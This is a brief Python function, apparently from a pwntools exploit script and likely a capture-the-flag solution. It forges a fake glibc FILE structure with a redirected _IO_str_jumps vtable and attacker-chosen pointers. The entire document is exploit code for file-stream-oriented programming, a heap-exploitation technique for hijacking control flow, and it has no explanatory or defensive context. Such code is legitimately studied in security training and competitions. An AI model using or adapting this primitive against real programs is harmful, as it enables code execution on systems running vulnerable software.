def Creat_File(rdi, addr, io_str_jump):
    _flags = 0
    vtable = io_str_jump - 0x8
    fake_file = p64(_flags)
    fake_file += p64(0x0) * 3 # read_ptr end base
    fake_file += p64(0x0)
    fake_file += p64(0x1) + p64(0x0)
    fake_file += p64(rdi) + p64(0x0)
    fake_file += p64(0x0) * 12
    fake_file += p64(0x0) + p64(0x0)
    fake_file += p64(0x0) + p64(0x0) 
    fake_file += p64(0x0) * 2
    fake_file += p64(vtable)
    fake_file += p64(addr) * 2
    return fake_file

